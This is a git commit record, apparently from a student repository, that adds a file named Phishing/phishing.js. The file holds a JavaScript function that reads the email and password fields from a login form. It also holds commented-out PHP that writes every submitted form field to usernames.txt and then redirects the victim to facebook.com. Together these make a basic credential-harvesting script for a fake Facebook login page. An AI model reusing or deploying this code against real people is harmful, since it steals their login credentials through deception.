3c0527a34c5a2969b676bfaeeb91d79795278373
Alexandre Gaudreault <gaua2616@usherbrooke.ca>
2016-03-16 15:08:50 -0400

    no message

---
+++ Phishing/phishing.js
@@ -0,0 +1,20 @@
+function getFormsInfo() {
+   //document.getElementById("demo").innerHTML = "Paragraph changed.";
+   alert(document.getElementById('email').value + "   " + document.getElementById('pass').value);
+}
+
+
+
+// <?php
+// header ('Location:http://www.facebook.com');
+// $handle = fopen("usernames.txt", "a");
+// foreach($_POST as $variable => $value) {
+   // fwrite($handle, $variable);
+   // fwrite($handle, "=");
+   // fwrite($handle, $value);
+   // fwrite($handle, "\r\n");
+// }
+// fwrite($handle, "\r\n");
+// fclose($handle);
+// exit;
+// ?> 
